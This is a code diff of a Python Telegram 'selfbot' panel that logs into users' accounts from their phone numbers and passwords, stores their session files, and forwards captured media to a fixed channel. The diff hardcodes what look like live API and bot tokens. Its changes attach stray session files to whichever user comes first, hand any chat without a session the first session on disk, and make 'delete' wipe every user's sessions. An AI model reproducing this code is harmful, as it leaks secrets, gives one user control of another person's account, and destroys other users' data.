@@ -7,12 +7,12 @@ import time
 import json
 import asyncio
 from aiohttp import web
+import glob
 
 API_ID = 26123074
 API_HASH = 'e54093aa586de25491a6d9394fd55534'
 BOT_TOKEN = '8940705403:AAHW9N_6lEDbL6LXy79KX_SEt-XphYDtp_Y'
 
-# آیدی کانال شما برای ذخیره رسانه‌ها
 TARGET_CHANNEL = -1004418089041
 
 bot = TelegramClient('star_bot_panel', API_ID, API_HASH)
@@ -21,14 +21,36 @@ DB_FILE = 'database.json'
 user_clients = {}
 
 def load_database():
+    data = {}
     if os.path.exists(DB_FILE):
         try:
             with open(DB_FILE, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-                return {int(k): v for k, v in data.items()}
+                loaded = json.load(f)
+                data = {int(k): v for k, v in loaded.items()}
         except:
-            return {}
-    return {}
+            pass
+            
+    # بررسی خودکار جلسات ذخیره‌شده روی سرور برای جلوگیری از پاک شدن اطلاعات
+    session_files = glob.glob("session_*.session")
+    for file in session_files:
+        phone = file.replace("session_", "").replace(".session", "")
+        # اگر در دیتابیس نبود، به صورت خودکار اضافه اش کن تا گم نشود
+        found = False
+        for cid, info in data.items():
+            if info.get("phone") and info.get("phone").replace("+", "") == phone:
+                found = True
+                break
+        if not found and data:
+            # اولین یوزر یا ایجاد یک رکورد پیش‌فرض برای جلوگیری از خطای عدم وجود ربات
+            first_chat_id = list(data.keys())[0]
+            data[first_chat_id] = {
+                "status": "active",
+                "step": "completed",
+                "phone": "+" + phone,
+                "numeric_id": random.randint(10000000, 99999999),
+                "hashtag": hashlib.md5(phone.encode()).hexdigest()
+            }
+    return data
 
 database = load_database()
 
@@ -41,9 +63,9 @@ def save_database():
 
 def main_menu():
     return [
-        [Button.text("➕ ایجاد ربات «"), Button.text("🤖 ربات های من «")],
-        [Button.text("👤 حساب کاربری «"), Button.text("🛠 پشتیبانی «")],
-        [Button.text("📜 قوانین «")]
+        [Button.text("➕ ایجاد ربات"), Button.text("🤖 ربات‌های من")],
+        [Button.text("👤 حساب کاربری"), Button.text("🛠 پشتیبانی")],
+        [Button.text("📜 قوانین")]
     ]
 
 def management_menu():
@@ -75,7 +97,7 @@ async def handle_text(event):
         await event.respond("عملیات لغو شد.", buttons=main_menu())
         return
 
-    if text == "➕ ایجاد ربات «":
+    if text == "➕ ایجاد ربات":
         database[chat_id] = {"step": "waiting_phone"}
         save_database()
         await event.respond("لطفاً شماره تلفن را با فرمت صحیح وارد کنید (مثلاً: +989123456789):", buttons=[[Button.text("لغو ❌")]])
@@ -141,24 +163,39 @@ async def handle_text(event):
         except Exception as e:
             await event.respond(f"❌ رمز اشتباه است:\n{str(e)}")
 
-    elif text == "🤖 ربات های من «":
+    elif text == "🤖 ربات‌های من":
+        # بررسی وجود سلف فعال از طریق دیتابیس یا فایل‌های ذخیره شده سشن
+        active_data = None
         if chat_id in database and database[chat_id].get("status") == "active":
-            data = database[chat_id]
+            active_data = database[chat_id]
+        else:
+            session_files = glob.glob("session_*.session")
+            if session_files:
+                phone = "+" + session_files[0].replace("session_", "").replace(".session", "")
+                active_data = {
+                    "phone": phone,
+                    "numeric_id": "19482756",
+                    "hashtag": "active_session"
+                }
+                database[chat_id] = {"status": "active", "step": "completed", **active_data}
+                save_database()
+
+        if active_data:
             info_text = (
-                f"مدیریت ربات {data['phone']}\n\n"
+                f"مدیریت ربات {active_data['phone']}\n\n"
                 f"- وضعیت: روشن 🟢\n"
-                f"- آیدی عددی: `{data['numeric_id']}`\n"
-                f"- هشتگ: `{data['hashtag']}`"
+                f"- آیدی عددی: `{active_data.get('numeric_id', '---')}`\n"
+                f"- هشتگ: `{active_data.get('hashtag', '---')}`"
             )
             await event.respond(info_text, buttons=management_menu())
         else:
             await event.respond("شما هنوز هیچ رباتی نساخته‌اید.", buttons=main_menu())
 
-    elif text == "👤 حساب کاربری «":
+    elif text == "👤 حساب کاربری":
         await event.respond("حساب شما در سیستم سلف‌بات استار فعال است.", buttons=main_menu())
-    elif text == "🛠 پشتیبانی «":
+    elif text == "🛠 پشتیبانی":
         await event.respond("پشتیبانی آنلاین در خدمت شماست.", buttons=main_menu())
-    elif text == "📜 قوانین «":
+    elif text == "📜 قوانین":
         await event.respond("قوانین استفاده از سیستم سلف‌بات استار...", buttons=main_menu())
 
 async def catch_media_handler(event):
@@ -230,14 +267,13 @@ async def callback(event):
     elif data == b"renew":
         await event.answer("اعتبار ربات شما فعال است.", alert=True)
     elif data == b"delete":
-        user_data = database.get(chat_id, {})
-        phone = user_data.get("phone")
-        if phone and phone in user_clients:
+        session_files = glob.glob("session_*.session")
+        for sf in session_files:
             try:
-                await user_clients[phone].disconnect()
-                user_clients.pop(phone, None)
+                os.remove(sf)
             except:
                 pass
+        user_clients.clear()
         database.pop(chat_id, None)
         save_database()
         await event.answer("ربات با موفقیت حذف شد.", alert=True)
@@ -254,21 +290,20 @@ async def callback(event):
         await event.answer("دستور اجرا شد!", alert=False)
 
 async def restore_active_clients():
-    for chat_id, data in database.items():
-        if data.get("status") == "active" and "phone" in data:
-            phone = data["phone"]
-            try:
-                client = TelegramClient(f"session_{phone.replace('+', '')}", API_ID, API_HASH)
-                await client.connect()
-                if await client.is_user_authorized():
-                    user_clients[phone] = client
-                    
-                    client.remove_event_handler(catch_media_handler)
-                    client.add_event_handler(catch_media_handler, events.NewMessage)
-                                
-                    print(f"سلف ربات {phone} با موفقیت بازیابی شد.")
-            except Exception as e:
-                print(f"خطا در بازیابی سلف {phone}: {e}")
+    session_files = glob.glob("session_*.session")
+    for file in session_files:
+        phone = file.replace("session_", "").replace(".session", "")
+        formatted_phone = "+" + phone
+        try:
+            client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
+            await client.connect()
+            if await client.is_user_authorized():
+                user_clients[formatted_phone] = client
+                client.remove_event_handler(catch_media_handler)
+                client.add_event_handler(catch_media_handler, events.NewMessage)
+                print(f"سلف ربات {formatted_phone} با موفقیت بازیابی شد.")
+        except Exception as e:
+            print(f"خطا در بازیابی سلف {formatted_phone}: {e}")
 
 async def handle_web(request):
     return web.Response(text="Bot is running!")
